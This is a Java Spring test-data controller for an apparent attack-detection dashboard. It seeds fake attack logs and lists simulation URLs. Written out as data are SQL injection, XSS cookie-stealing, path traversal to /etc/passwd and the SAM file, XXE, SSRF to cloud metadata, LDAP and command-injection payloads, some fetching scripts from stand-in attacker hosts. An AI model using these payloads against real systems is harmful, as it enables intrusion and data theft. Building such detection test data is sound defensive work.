package org.cyberwatch.controller;

import org.cyberwatch.model.AttackLog;
import org.cyberwatch.repository.AttackLogRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.time.LocalDateTime;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;
import java.util.Arrays;
import java.util.List;

@RestController
@RequestMapping("/test/data")
public class TestDataController {

    @Autowired
    private AttackLogRepository attackLogRepository;

    private final Random random = new Random();

    private final String[] attackTypes = {
            "SQL_INJECTION", "XSS", "BRUTE_FORCE", "COMMAND_INJECTION",
            "DIRECTORY_TRAVERSAL", "SSRF", "XXE", "LOG_INJECTION",
            "CSRF", "FILE_UPLOAD_ATTACK", "LDAP_INJECTION", "DDOS"
    };

    private final String[] sourceIps = {
            "192.168.1.100", "10.0.0.50", "172.16.0.25", "203.0.113.45",
            "198.51.100.12", "185.220.101.45", "94.102.49.190", "46.101.127.145",
            "139.180.132.96", "165.227.47.213", "159.89.214.31", "134.209.24.42"
    };

    private final String[] userAgents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
            "sqlmap/1.0-dev", "Nikto/2.1.6", "Nmap Scripting Engine",
            "curl/7.68.0", "python-requests/2.25.1", "Burp Suite Professional",
            "OWASP ZAP 2.10.0", "w3af.org", "Gobuster/3.0.1"
    };

    private final String[] targetEndpoints = {
            "/api/users", "/api/login", "/api/products", "/api/search", "/admin/dashboard",
            "/user/profile", "/api/files", "/api/comments", "/api/orders", "/api/payments",
            "/wp-admin/admin.php", "/phpmyadmin/index.php", "/api/v1/auth", "/rest/api/user",
            "/servlet/LoginServlet", "/cgi-bin/test.cgi", "/api/graphql"
    };

    private final String[] httpMethods = {"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"};

    @PostMapping("/generate-sample-attacks")
    public ResponseEntity<Map<String, Object>> generateSampleAttacks(
            @RequestParam(defaultValue = "50") int count) {

        int successfulInserts = 0;
        Map<String, Integer> attackTypeCount = new HashMap<>();

        for (int i = 0; i < count; i++) {
            try {
                AttackLog log = generateRealisticAttackLog(i + 1);
                attackLogRepository.save(log);
                successfulInserts++;
                String attackType = log.getAttackType();
                attackTypeCount.put(attackType, attackTypeCount.getOrDefault(attackType, 0) + 1);

            } catch (Exception e) {
                System.err.println("Error generating attack log #" + (i + 1) + ": " + e.getMessage());
            }
        }

        Map<String, Object> response = new LinkedHashMap<>();
        response.put("message", "Sample attacks generated successfully");
        response.put("requestedCount", count);
        response.put("successfulInserts", successfulInserts);
        response.put("attackTypeDistribution", attackTypeCount);
        response.put("generatedAt", LocalDateTime.now());

        return ResponseEntity.ok(response);
    }


    private AttackLog generateRealisticAttackLog(int attackNumber) {
        AttackLog log = new AttackLog();

        String attackType = attackTypes[random.nextInt(attackTypes.length)];
        String sourceIp = sourceIps[random.nextInt(sourceIps.length)];
        String userAgent = userAgents[random.nextInt(userAgents.length)];
        String targetEndpoint = targetEndpoints[random.nextInt(targetEndpoints.length)];
        String httpMethod = httpMethods[random.nextInt(httpMethods.length)];

        log.setAttackType(attackType);
        log.setSourceIp(sourceIp);
        log.setUserAgent(userAgent);
        log.setTargetEndpoint(targetEndpoint);
        log.setRequestMethod(httpMethod);

        Map<String, String> attackDetails = generateAttackDetails(attackType, sourceIp, targetEndpoint, attackNumber);
        log.setDescription(attackDetails.get("description"));
        log.setRequestPayload(attackDetails.get("payload"));
        log.setSeverity(calculateRealisticSeverity(attackType, userAgent, sourceIp));

        int minutesBack = random.nextInt(7 * 24 * 60); // 7 days in minutes
        log.setDetectedAt(LocalDateTime.now().minusMinutes(minutesBack));
        log.setBlocked(shouldAttackBeBlocked(attackType, log.getSeverity()));
        log.setAttackCount(generateAttackCount(attackType));

        return log;
    }


    private Map<String, String> generateAttackDetails(String attackType, String sourceIp, String endpoint, int attackNumber) {
        Map<String, String> details = new HashMap<>();

        switch (attackType) {
            case "SQL_INJECTION":
                details.put("description", "SQL injection attempt detected in parameter 'id' - " + getSQLInjectionVariant());
                details.put("payload", generateSQLInjectionPayload());
                break;

            case "XSS":
                details.put("description", "Cross-site scripting attack detected in user input - " + getXSSVariant());
                details.put("payload", generateXSSPayload());
                break;

            case "BRUTE_FORCE":
                int attempts = 5 + random.nextInt(45); // 5-50 attempts
                details.put("description", "Brute force attack detected: " + attempts + " failed login attempts within 5 minutes");
                details.put("payload", generateBruteForcePayload());
                break;

            case "COMMAND_INJECTION":
                details.put("description", "Command injection attempt detected - trying to execute system commands");
                details.put("payload", generateCommandInjectionPayload());
                break;

            case "DIRECTORY_TRAVERSAL":
                details.put("description", "Path traversal attack detected - attempting to access sensitive files");
                details.put("payload", generateDirectoryTraversalPayload());
                break;

            case "SSRF":
                details.put("description", "Server-Side Request Forgery detected - attempting to access internal resources");
                details.put("payload", generateSSRFPayload());
                break;

            case "XXE":
                details.put("description", "XML External Entity injection detected - attempting to read system files");
                details.put("payload", generateXXEPayload());
                break;

            case "LOG_INJECTION":
                details.put("description", "Log injection attack detected - attempting to inject malicious log entries");
                details.put("payload", generateLogInjectionPayload());
                break;

            case "CSRF":
                details.put("description", "Cross-Site Request Forgery detected - unauthorized state-changing request");
                details.put("payload", generateCSRFPayload());
                break;

            case "FILE_UPLOAD_ATTACK":
                details.put("description", "Malicious file upload detected - attempting to upload executable content");
                details.put("payload", generateFileUploadPayload());
                break;

            case "LDAP_INJECTION":
                details.put("description", "LDAP injection attack detected in authentication parameters");
                details.put("payload", generateLDAPInjectionPayload());
                break;

            case "DDOS":
                int requestCount = 100 + random.nextInt(900); // 100-1000 requests
                details.put("description", "DDoS attack detected: " + requestCount + " requests in 60 seconds from " + sourceIp);
                details.put("payload", "High frequency requests detected");
                break;

            default:
                details.put("description", "Generic security threat detected from " + sourceIp);
                details.put("payload", "Suspicious activity pattern identified");
        }

        return details;
    }

    private String generateSQLInjectionPayload() {
        String[] payloads = {
                "' OR '1'='1' --",
                "' UNION SELECT username,password FROM users --",
                "'; DROP TABLE users; --",
                "' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
                "' OR 1=1 AND '1'='1",
                "admin'/**/OR/**/1=1/**/--"
        };
        return "input=" + payloads[random.nextInt(payloads.length)];
    }

    private String generateXSSPayload() {
        String[] payloads = {
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(document.cookie)>",
                "javascript:alert('XSS')",
                "<svg/onload=alert(/XSS/)>",
                "'><script>alert(String.fromCharCode(88,83,83))</script>",
                "<iframe src=javascript:alert('XSS')></iframe>"
        };
        return "comment=" + payloads[random.nextInt(payloads.length)];
    }

    private String generateBruteForcePayload() {
        String[] passwords = {"admin", "password", "123456", "password123", "admin123", "root", "toor", "qwerty"};
        return "username=admin&password=" + passwords[random.nextInt(passwords.length)];
    }

    private String generateCommandInjectionPayload() {
        String[] payloads = {
                "8.8.8.8; cat /etc/passwd",
                "127.0.0.1 && ls -la",
                "localhost | whoami",
                "google.com; wget http://malicious.com/shell.sh",
                "test`id`",
                "$(curl http://attacker.com/steal.sh)"
        };
        return "host=" + payloads[random.nextInt(payloads.length)];
    }

    private String generateDirectoryTraversalPayload() {
        String[] payloads = {
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc//passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "....\\....\\....\\boot.ini"
        };
        return "file=" + payloads[random.nextInt(payloads.length)];
    }

    private String generateSSRFPayload() {
        String[] payloads = {
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:22",
                "http://127.0.0.1:8080/admin",
                "file:///etc/passwd",
                "http://internal.company.com/admin",
                "gopher://localhost:25/"
        };
        return "url=" + payloads[random.nextInt(payloads.length)];
    }

    private String generateXXEPayload() {
        return "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>";
    }

    private String generateLogInjectionPayload() {
        String[] payloads = {
                "admin\\n[FAKE] User admin logged in successfully",
                "test\\r\\n2024-01-01 00:00:00 [INFO] Fake log entry",
                "user\\0[ERROR] System compromised",
                "normal_user\\n\\n[ADMIN] Emergency access granted"
        };
        return "username=" + payloads[random.nextInt(payloads.length)];
    }

    private String generateCSRFPayload() {
        return "<form action='/transfer' method='POST'><input name='amount' value='10000'><input name='to' value='attacker_account'></form>";
    }

    private String generateFileUploadPayload() {
        String[] payloads = {
                "shell.php with PHP webshell content",
                "malware.exe disguised as image.jpg",
                "exploit.jsp with server-side code",
                "backdoor.aspx with malicious payload",
                "script.py with system access commands"
        };
        return payloads[random.nextInt(payloads.length)];
    }

    private String generateLDAPInjectionPayload() {
        String[] payloads = {
                "admin)(|(password=*))",
                "*)(&(objectClass=user)(cn=*))",
                "user)(|(cn=*))(password=*",
                "*)(uid=*))(|(uid=*"
        };
        return "username=" + payloads[random.nextInt(payloads.length)];
    }

    private String getSQLInjectionVariant() {
        String[] variants = {"Union-based", "Boolean-based blind", "Time-based blind", "Error-based", "Stacked queries"};
        return variants[random.nextInt(variants.length)];
    }

    private String getXSSVariant() {
        String[] variants = {"Stored XSS", "Reflected XSS", "DOM-based XSS", "Self-XSS"};
        return variants[random.nextInt(variants.length)];
    }

    private AttackLog.Severity calculateRealisticSeverity(String attackType, String userAgent, String sourceIp) {
        int severityScore = 0;

        switch (attackType) {
            case "SQL_INJECTION", "COMMAND_INJECTION", "XXE" -> severityScore += 80;
            case "XSS", "SSRF", "BRUTE_FORCE" -> severityScore += 60;
            case "DIRECTORY_TRAVERSAL", "CSRF", "FILE_UPLOAD_ATTACK" -> severityScore += 40;
            default -> severityScore += 20;
        }

        if (userAgent.contains("sqlmap") || userAgent.contains("Nikto") ||
                userAgent.contains("Nmap") || userAgent.contains("Burp")) {
            severityScore += 20;
        }

        severityScore += random.nextInt(20) - 10;

        if (severityScore >= 80) return AttackLog.Severity.CRITICAL;
        if (severityScore >= 60) return AttackLog.Severity.HIGH;
        if (severityScore >= 40) return AttackLog.Severity.MEDIUM;
        return AttackLog.Severity.LOW;
    }

    private boolean shouldAttackBeBlocked(String attackType, AttackLog.Severity severity) {
        if (severity == AttackLog.Severity.CRITICAL) return random.nextDouble() < 0.9;
        if (severity == AttackLog.Severity.HIGH) return random.nextDouble() < 0.7;
        if (severity == AttackLog.Severity.MEDIUM) return random.nextDouble() < 0.4;
        return random.nextDouble() < 0.1;
    }

    private int generateAttackCount(String attackType) {
        return switch (attackType) {
            case "BRUTE_FORCE", "DDOS" -> 1 + random.nextInt(50);
            case "SQL_INJECTION", "XSS" -> 1 + random.nextInt(10);
            default -> 1 + random.nextInt(5);
        };
    }

    @GetMapping("/attack-simulation-urls")
    public ResponseEntity<Map<String, Object>> getAttackSimulationUrls() {
        Map<String, Object> urls = new LinkedHashMap<>();

        Map<String, String> sqlInjection = new LinkedHashMap<>();
        sqlInjection.put("basic_auth_bypass", "/test/vulnerable?input=' OR 1=1--");
        sqlInjection.put("union_based", "/test/vulnerable?input=' UNION SELECT username,password FROM users--");
        sqlInjection.put("error_based", "/test/vulnerable?input=' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--");
        sqlInjection.put("boolean_blind", "/test/vulnerable?input=' AND 1=1--");
        sqlInjection.put("time_based", "/test/vulnerable?input='; WAITFOR DELAY '0:0:5'--");
        urls.put("sql_injection", sqlInjection);

        Map<String, String> xss = new LinkedHashMap<>();
        xss.put("basic_script", "/test/comment?comment=<script>alert('XSS')</script>");
        xss.put("img_onerror", "/test/comment?comment=<img src=x onerror=alert(document.cookie)>");
        xss.put("svg_onload", "/test/comment?comment=<svg/onload=alert('XSS')>");
        xss.put("javascript_protocol", "/test/comment?comment=javascript:alert('XSS')");
        xss.put("iframe_src", "/test/comment?comment=<iframe src=javascript:alert('XSS')></iframe>");
        urls.put("xss", xss);

        Map<String, String> pathTraversal = new LinkedHashMap<>();
        pathTraversal.put("linux_passwd", "/test/file?filename=../../../../etc/passwd");
        pathTraversal.put("windows_boot", "/test/file?filename=..\\..\\..\\boot.ini");
        pathTraversal.put("encoded_traversal", "/test/file?filename=%2e%2e%2f%2e%2e%2fetc%2fpasswd");
        pathTraversal.put("double_encoding", "/test/file?filename=..%252f..%252fetc%252fpasswd");
        urls.put("directory_traversal", pathTraversal);

        Map<String, String> bruteForce = new LinkedHashMap<>();
        bruteForce.put("endpoint", "/test/login");
        bruteForce.put("method", "POST");
        bruteForce.put("description", "Send multiple POST requests with different passwords");
        bruteForce.put("example_1", "username=admin&password=admin");
        bruteForce.put("example_2", "username=admin&password=password");
        bruteForce.put("example_3", "username=admin&password=123456");
        urls.put("brute_force", bruteForce);

        Map<String, String> commandInjection = new LinkedHashMap<>();
        commandInjection.put("basic_unix", "/test/vulnerable?input=; cat /etc/passwd");
        commandInjection.put("basic_windows", "/test/vulnerable?input=& dir");
        commandInjection.put("pipe_command", "/test/vulnerable?input=| whoami");
        commandInjection.put("backtick_execution", "/test/vulnerable?input=`id`");
        urls.put("command_injection", commandInjection);

        Map<String, Object> testingInfo = new LinkedHashMap<>();
        testingInfo.put("note", "All URLs are designed for testing the security system");
        testingInfo.put("recommendation", "Test these URLs to verify attack detection is working");
        testingInfo.put("safety", "These are safe test URLs that won't cause actual damage");
        urls.put("testing_information", testingInfo);

        return ResponseEntity.ok(urls);
    }

    @GetMapping("/attack-statistics")
    public ResponseEntity<Map<String, Object>> getAttackStatistics() {
        Map<String, Object> stats = new LinkedHashMap<>();

        long totalAttacks = attackLogRepository.count();
        stats.put("totalAttacksInDatabase", totalAttacks);

        Map<String, Long> attackByType = new HashMap<>();
        for (String type : attackTypes) {
            long count = attackLogRepository.countByAttackType(type);
            if (count > 0) {
                attackByType.put(type, count);
            }
        }
        stats.put("attacksByType", attackByType);

        LocalDateTime last24Hours = LocalDateTime.now().minusHours(24);
        long recentAttacks = attackLogRepository.countAttacksSince(last24Hours);
        stats.put("attacksLast24Hours", recentAttacks);

        stats.put("generatedAt", LocalDateTime.now());

        return ResponseEntity.ok(stats);
    }
}
